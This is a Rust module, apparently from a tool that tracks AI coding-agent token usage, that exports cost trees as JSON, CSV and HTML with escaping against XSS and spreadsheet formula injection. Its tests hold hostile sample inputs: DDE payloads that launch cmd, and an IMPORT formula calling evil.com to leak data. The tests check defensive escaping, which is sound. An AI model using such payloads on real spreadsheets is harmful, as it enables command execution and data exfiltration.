// SPDX-License-Identifier: Apache-2.0
use crate::tree::{ProjectTree, WorkTreeNode};
use anyhow::Result;

pub fn html_escape(input: &str) -> String {
    let mut escaped = String::with_capacity(input.len());
    for c in input.chars() {
        match c {
            '&' => escaped.push_str("&amp;"),
            '<' => escaped.push_str("&lt;"),
            '>' => escaped.push_str("&gt;"),
            '"' => escaped.push_str("&quot;"),
            '\'' => escaped.push_str("&#39;"),
            _ => escaped.push(c),
        }
    }
    escaped
}

pub fn csv_escape(input: &str) -> String {
    let raw_starts_control =
        input.starts_with('\t') || input.starts_with('\r') || input.starts_with('\n');
    let trimmed = input.trim_start();
    let needs_formula_neutralization = raw_starts_control
        || trimmed.starts_with('=')
        || trimmed.starts_with('+')
        || trimmed.starts_with('-')
        || trimmed.starts_with('@')
        || trimmed.starts_with('|')
        || trimmed.starts_with('%')
        || trimmed.starts_with('\t')
        || trimmed.starts_with('\r');

    let escaped = input.replace('"', "\"\"");
    if needs_formula_neutralization {
        format!("'{escaped}")
    } else {
        escaped
    }
}

pub fn export_json(trees: &[ProjectTree]) -> Result<String> {
    Ok(serde_json::to_string_pretty(trees)?)
}

pub fn export_csv(trees: &[ProjectTree]) -> Result<String> {
    let mut out = String::new();
    out.push_str("project_id,project_key,project_title,work_item_id,work_item_title,parent_id,input_tokens,cache_read_tokens,cache_write_tokens,output_tokens,reasoning_tokens,total_tokens,requests,measured_requests,unavailable_requests,estimated_cost_dollars,completeness_pct\n");

    fn write_node(
        out: &mut String,
        project_id: &str,
        project_key: &str,
        project_title: &str,
        node: &WorkTreeNode,
    ) {
        let u = &node.inclusive;
        let total_tokens = u.input + u.cache_read + u.cache_write + u.output + u.reasoning;
        let cost_dollars = if u.requests > 0 && u.priced == u.requests {
            format!("{:.4}", u.amount_micros as f64 / 1_000_000.0)
        } else {
            "unavailable".to_string()
        };
        let completeness = if u.requests == 0 {
            "unavailable".to_string()
        } else {
            format!(
                "{:.1}",
                100.0 * u.measured as f64 / (u.measured + u.unavailable) as f64
            )
        };

        let parent_id_str = node.parent_id.as_deref().unwrap_or("");

        // CSV escape quotes and neutralize formula injection on EVERY string field
        let safe_prj_id = csv_escape(project_id);
        let safe_prj_key = csv_escape(project_key);
        let safe_prj_title = csv_escape(project_title);
        let safe_node_id = csv_escape(&node.id);
        let safe_title = csv_escape(&node.title);
        let safe_parent_id = csv_escape(parent_id_str);

        out.push_str(&format!(
            "\"{}\",\"{}\",\"{}\",\"{}\",\"{}\",\"{}\",{},{},{},{},{},{},{},{},{},{},{}\n",
            safe_prj_id,
            safe_prj_key,
            safe_prj_title,
            safe_node_id,
            safe_title,
            safe_parent_id,
            u.input,
            u.cache_read,
            u.cache_write,
            u.output,
            u.reasoning,
            total_tokens,
            u.requests,
            u.measured,
            u.unavailable,
            cost_dollars,
            completeness,
        ));

        for child in &node.children {
            write_node(out, project_id, project_key, project_title, child);
        }
    }

    for tree in trees {
        for root in &tree.roots {
            write_node(&mut out, &tree.id, &tree.key, &tree.title, root);
        }
    }

    Ok(out)
}

pub fn export_html(trees: &[ProjectTree], disclaimer: &str) -> String {
    let mut total_tokens = 0u64;
    let mut total_micros = 0u64;
    let mut total_requests = 0u64;
    let mut total_measured = 0u64;
    let mut total_unavailable = 0u64;
    let mut fully_priced = true;

    for tree in trees {
        let t = &tree.totals;
        total_tokens += t.input + t.cache_read + t.cache_write + t.output + t.reasoning;
        total_micros += t.amount_micros;
        total_requests += t.requests;
        total_measured += t.measured;
        total_unavailable += t.unavailable;
        if t.requests > 0 && t.priced < t.requests {
            fully_priced = false;
        }
    }

    let overall_cost = if total_requests > 0 && fully_priced {
        format!("${:.2}", total_micros as f64 / 1_000_000.0)
    } else {
        "Cost Unavailable".to_string()
    };

    let overall_completeness = if total_requests == 0 {
        100.0
    } else {
        100.0 * total_measured as f64 / (total_measured + total_unavailable) as f64
    };

    fn render_node_html(node: &WorkTreeNode, depth: usize) -> String {
        let mut html = String::new();
        let indent = depth * 24;
        let u = &node.inclusive;
        let total_tok = u.input + u.cache_read + u.cache_write + u.output + u.reasoning;
        let cost = if u.requests > 0 && u.priced == u.requests {
            format!("${:.2}", u.amount_micros as f64 / 1_000_000.0)
        } else {
            "unavailable".to_string()
        };

        let comp_badge = if u.requests == 0 {
            r#"<span class="badge badge-muted">no requests</span>"#.to_string()
        } else if u.unavailable == 0 {
            r#"<span class="badge badge-green">100% complete</span>"#.to_string()
        } else {
            let pct = 100.0 * u.measured as f64 / (u.measured + u.unavailable) as f64;
            format!(
                r#"<span class="badge badge-amber">{pct:.0}% complete ({} unavailable)</span>"#,
                u.unavailable
            )
        };

        let has_children = !node.children.is_empty();
        let toggle_icon = if has_children {
            r#"<span class="toggle-icon">▾</span>"#
        } else {
            r#"<span class="leaf-icon">•</span>"#
        };

        let safe_title = html_escape(&node.title);
        let safe_id = html_escape(&node.id);

        html.push_str(&format!(
            r#"<div class="node-wrapper" style="margin-left: {indent}px;">
  <div class="tree-node" data-id="{safe_id}">
    <div class="node-left">
      {toggle_icon}
      <span class="node-title">{safe_title}</span>
      <span class="node-id">{safe_id}</span>
    </div>
    <div class="node-metrics">
      <span class="metric-cost">{cost}</span>
      <span class="metric-tokens">{total_tok} tok</span>
      {comp_badge}
    </div>
  </div>
</div>
"#
        ));

        if has_children {
            html.push_str(r#"<div class="node-children">"#);
            for child in &node.children {
                html.push_str(&render_node_html(child, depth + 1));
            }
            html.push_str(r#"</div>"#);
        }

        html
    }

    let mut projects_html = String::new();
    for tree in trees {
        let safe_prj_title = html_escape(&tree.title);
        let safe_prj_key = html_escape(&tree.key);
        let t = &tree.totals;
        let prj_tok = t.input + t.cache_read + t.cache_write + t.output + t.reasoning;
        let prj_cost = if t.requests > 0 && t.priced == t.requests {
            format!("${:.2}", t.amount_micros as f64 / 1_000_000.0)
        } else {
            "unavailable".to_string()
        };

        let comp_badge = if t.requests == 0 {
            r#"<span class="badge badge-muted">no requests</span>"#.to_string()
        } else if t.unavailable == 0 {
            r#"<span class="badge badge-green">100% complete</span>"#.to_string()
        } else {
            let pct = 100.0 * t.measured as f64 / (t.measured + t.unavailable) as f64;
            format!(
                r#"<span class="badge badge-amber">{pct:.0}% complete ({} unavailable)</span>"#,
                t.unavailable
            )
        };

        let mut roots_html = String::new();
        if tree.roots.is_empty() {
            roots_html.push_str(r#"<div class="empty-state">No work items recorded.</div>"#);
        } else {
            for root in &tree.roots {
                roots_html.push_str(&render_node_html(root, 0));
            }
        }

        projects_html.push_str(&format!(
            r#"<div class="project-card" data-key="{safe_prj_key}">
  <div class="project-header">
    <div class="project-header-left">
      <h2 class="project-title">{safe_prj_title}</h2>
      <span class="project-key">{safe_prj_key}</span>
    </div>
    <div class="project-header-right">
      <span class="project-cost">{prj_cost}</span>
      <span class="project-tokens">{prj_tok} tok</span>
      {comp_badge}
    </div>
  </div>
  <div class="project-tree-container">
    {roots_html}
  </div>
</div>
"#
        ));
    }

    if trees.is_empty() {
        projects_html = r#"<div class="empty-state-large">No projects or usage events found in the ledger.</div>"#.to_string();
    }

    let safe_disclaimer = html_escape(disclaimer);

    format!(
        r#"<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>TokenTree — Cost &amp; Work-Item Report</title>
  <meta http-equiv="Content-Security-Policy" content="default-src 'self' 'unsafe-inline' data:;">
  <style>
    *, *::before, *::after {{
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }}
    body {{
      background-color: #181818;
      color: #E0E0E0;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      font-size: 14px;
      line-height: 20px;
      padding: 32px 24px;
      min-height: 100vh;
    }}
    .container {{
      max-width: 1080px;
      margin: 0 auto;
    }}
    header {{
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 32px;
      padding-bottom: 24px;
      border-bottom: 1px solid #313131;
    }}
    .brand {{
      display: flex;
      align-items: center;
      gap: 12px;
    }}
    .logo-badge {{
      display: inline-flex;
      align-items: center;
      justify-content: center;
      width: 36px;
      height: 36px;
      background-color: #272727;
      border: 1px solid #313131;
      border-radius: 8px;
      font-weight: 700;
      color: #3B82F6;
      font-size: 18px;
    }}
    .hero-title {{
      font-size: 24px;
      font-weight: 600;
      line-height: 32px;
      background: linear-gradient(to right, #FFFFFF, #9B9B9B);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      text-wrap: balance;
    }}
    .subtitle {{
      color: #9B9B9B;
      font-size: 14px;
    }}
    .stats-bar {{
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
      gap: 16px;
      margin-bottom: 32px;
    }}
    .stat-card {{
      background-color: #1F1F1F;
      border: 1px solid #313131;
      border-radius: 12px;
      padding: 16px;
    }}
    .stat-label {{
      font-size: 12px;
      color: #9B9B9B;
      margin-bottom: 4px;
      text-transform: uppercase;
      letter-spacing: 0.05em;
    }}
    .stat-value {{
      font-size: 20px;
      font-weight: 600;
      color: #FFFFFF;
      font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace;
    }}
    .search-filter {{
      margin-bottom: 24px;
      display: flex;
      gap: 12px;
    }}
    .search-input {{
      flex: 1;
      background-color: #1F1F1F;
      border: 1px solid #313131;
      border-radius: 8px;
      padding: 8px 12px;
      color: #FFFFFF;
      font-size: 14px;
      outline: none;
      transition: border-color 0.2s;
    }}
    .search-input:focus {{
      border-color: #3B82F6;
    }}
    .project-card {{
      background-color: #1F1F1F;
      border: 1px solid #313131;
      border-radius: 16px;
      margin-bottom: 24px;
      overflow: hidden;
    }}
    .project-header {{
      background-color: #272727;
      padding: 16px 20px;
      display: flex;
      justify-content: space-between;
      align-items: center;
      border-bottom: 1px solid #313131;
    }}
    .project-header-left {{
      display: flex;
      align-items: center;
      gap: 12px;
    }}
    .project-title {{
      font-size: 18px;
      font-weight: 600;
      color: #FFFFFF;
    }}
    .project-key {{
      font-size: 12px;
      background-color: #181818;
      border: 1px solid #313131;
      padding: 2px 8px;
      border-radius: 6px;
      color: #9B9B9B;
      font-family: ui-monospace, monospace;
    }}
    .project-header-right {{
      display: flex;
      align-items: center;
      gap: 16px;
    }}
    .project-cost, .metric-cost {{
      font-family: ui-monospace, monospace;
      font-weight: 600;
      color: #10B981;
    }}
    .project-tokens, .metric-tokens {{
      font-family: ui-monospace, monospace;
      color: #9B9B9B;
    }}
    .project-tree-container {{
      padding: 16px 20px;
    }}
    .node-wrapper {{
      margin-top: 8px;
      margin-bottom: 8px;
    }}
    .tree-node {{
      background-color: #272727;
      border: 1px solid #313131;
      border-radius: 8px;
      padding: 10px 14px;
      display: flex;
      justify-content: space-between;
      align-items: center;
      transition: background-color 0.15s;
    }}
    .tree-node:hover {{
      background-color: #313131;
    }}
    .node-left {{
      display: flex;
      align-items: center;
      gap: 10px;
    }}
    .toggle-icon {{
      color: #9B9B9B;
      font-size: 12px;
      width: 14px;
      cursor: pointer;
    }}
    .leaf-icon {{
      color: #6B7280;
      font-size: 14px;
      width: 14px;
      text-align: center;
    }}
    .node-title {{
      font-weight: 500;
      color: #FFFFFF;
    }}
    .node-id {{
      font-size: 11px;
      color: #6B7280;
      font-family: ui-monospace, monospace;
    }}
    .node-metrics {{
      display: flex;
      align-items: center;
      gap: 12px;
    }}
    .badge {{
      display: inline-block;
      padding: 2px 8px;
      border-radius: 4px;
      font-size: 11px;
      font-weight: 500;
    }}
    .badge-green {{
      background-color: rgba(16, 185, 129, 0.15);
      color: #10B981;
      border: 1px solid rgba(16, 185, 129, 0.3);
    }}
    .badge-amber {{
      background-color: rgba(245, 158, 11, 0.15);
      color: #F59E0B;
      border: 1px solid rgba(245, 158, 11, 0.3);
    }}
    .badge-muted {{
      background-color: rgba(107, 114, 128, 0.15);
      color: #9B9B9B;
      border: 1px solid rgba(107, 114, 128, 0.3);
    }}
    .empty-state {{
      padding: 16px;
      color: #6B7280;
      font-style: italic;
    }}
    .empty-state-large {{
      text-align: center;
      padding: 64px 24px;
      color: #9B9B9B;
      background-color: #1F1F1F;
      border: 1px solid #313131;
      border-radius: 16px;
    }}
    footer {{
      margin-top: 48px;
      padding-top: 24px;
      border-top: 1px solid #313131;
      text-align: center;
      color: #6B7280;
      font-size: 12px;
      line-height: 18px;
    }}
  </style>
</head>
<body>
  <div class="container">
    <header>
      <div class="brand">
        <div class="logo-badge">TT</div>
        <div>
          <h1 class="hero-title">TokenTree</h1>
          <p class="subtitle">Hierarchical AI coding agent usage &amp; attribution ledger</p>
        </div>
      </div>
    </header>

    <div class="stats-bar">
      <div class="stat-card">
        <div class="stat-label">Estimated Cost</div>
        <div class="stat-value">{overall_cost}</div>
      </div>
      <div class="stat-card">
        <div class="stat-label">Total Tokens</div>
        <div class="stat-value">{total_tokens}</div>
      </div>
      <div class="stat-card">
        <div class="stat-label">Completeness</div>
        <div class="stat-value">{overall_completeness:.0}%</div>
      </div>
      <div class="stat-card">
        <div class="stat-label">Unavailable Requests</div>
        <div class="stat-value">{total_unavailable}</div>
      </div>
    </div>

    <div class="search-filter">
      <input type="text" id="searchInput" class="search-input" placeholder="Filter projects and work items..." autocomplete="off">
    </div>

    <main id="projectsContainer">
      {projects_html}
    </main>

    <footer>
      <p>{safe_disclaimer}</p>
    </footer>
  </div>

  <script>
    document.getElementById('searchInput').addEventListener('input', function(e) {{
      const term = e.target.value.toLowerCase().trim();
      const cards = document.querySelectorAll('.project-card');
      cards.forEach(card => {{
        const text = card.textContent.toLowerCase();
        card.style.display = text.includes(term) ? '' : 'none';
      }});
    }});
  </script>
</body>
</html>
"#
    )
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::tree::UsageTotals;

    #[test]
    fn html_escape_handles_special_characters() {
        assert_eq!(
            html_escape("<script>alert('xss' & \"attack\")</script>"),
            "&lt;script&gt;alert(&#39;xss&#39; &amp; &quot;attack&quot;)&lt;/script&gt;"
        );
    }

    #[test]
    fn export_csv_and_html_generate_valid_output() {
        let tree = ProjectTree {
            id: "prj_test".into(),
            key: "test-app".into(),
            title: "Test Application".into(),
            roots: vec![WorkTreeNode {
                id: "wrk_1".into(),
                title: "Fix bug".into(),
                parent_id: None,
                direct: UsageTotals {
                    input: 100,
                    output: 200,
                    requests: 1,
                    measured: 1,
                    priced: 1,
                    amount_micros: 50_000,
                    ..Default::default()
                },
                inclusive: UsageTotals {
                    input: 100,
                    output: 200,
                    requests: 1,
                    measured: 1,
                    priced: 1,
                    amount_micros: 50_000,
                    ..Default::default()
                },
                children: vec![],
            }],
            totals: UsageTotals {
                input: 100,
                output: 200,
                requests: 1,
                measured: 1,
                priced: 1,
                amount_micros: 50_000,
                ..Default::default()
            },
        };

        let csv = export_csv(std::slice::from_ref(&tree)).unwrap();
        assert!(csv.contains("project_id,project_key"));
        assert!(csv.contains("Test Application"));
        assert!(csv.contains("Fix bug"));

        let html = export_html(&[tree], "Test disclaimer");
        assert!(html.contains("Test Application"));
        assert!(html.contains("Fix bug"));
        assert!(html.contains("Test disclaimer"));
        assert!(html.contains("$0.05"));
    }

    #[test]
    fn test_csv_export_neutralizes_all_string_columns_against_formula_injection() {
        let tree = ProjectTree {
            id: "=cmd|' /C calc'!A0".into(),
            key: "+12345".into(),
            title: "  -SUM(A1:A10)".into(),
            roots: vec![WorkTreeNode {
                id: "@IMPORT(\"http://evil.com/leak\")".into(),
                title: "\t=DDE(\"cmd\",\"/C calc\",\"!\")".into(),
                parent_id: Some("\r-EXPLOIT()".into()),
                direct: UsageTotals::default(),
                inclusive: UsageTotals::default(),
                children: vec![WorkTreeNode {
                    id: "child_\"with_quotes\"".into(),
                    title: "Child, with comma and\r\nnewline".into(),
                    parent_id: Some("@IMPORT(\"http://evil.com/leak\")".into()),
                    direct: UsageTotals::default(),
                    inclusive: UsageTotals::default(),
                    children: vec![],
                }],
            }],
            totals: UsageTotals::default(),
        };

        let csv = export_csv(std::slice::from_ref(&tree)).unwrap();
        let lines: Vec<&str> = csv.lines().collect();
        assert!(lines.len() >= 3);

        // Header
        assert_eq!(
            lines[0],
            "project_id,project_key,project_title,work_item_id,work_item_title,parent_id,input_tokens,cache_read_tokens,cache_write_tokens,output_tokens,reasoning_tokens,total_tokens,requests,measured_requests,unavailable_requests,estimated_cost_dollars,completeness_pct"
        );

        // Line 1: Root node
        // project_id: '=cmd|...
        assert!(lines[1].starts_with("\"'=cmd|' /C calc'!A0\""));
        // project_key: '+12345
        assert!(lines[1].contains("\"'+12345\""));
        // project_title: '  -SUM...
        assert!(lines[1].contains("\"'  -SUM(A1:A10)\""));
        // work_item_id: '@IMPORT...
        assert!(lines[1].contains("\"'@IMPORT(\"\"http://evil.com/leak\"\")\""));
        // work_item_title: '\t=DDE...
        assert!(lines[1].contains("\"'\t=DDE(\"\"cmd\"\",\"\"/C calc\"\",\"\"!\"\")\""));
        // parent_id: '\r-EXPLOIT...
        assert!(lines[1].contains("\"'\r-EXPLOIT()\""));

        // Verify quotes and newlines in child node
        assert!(csv.contains("\"child_\"\"with_quotes\"\"\""));
        assert!(csv.contains("\"Child, with comma and\r\nnewline\""));
    }
}
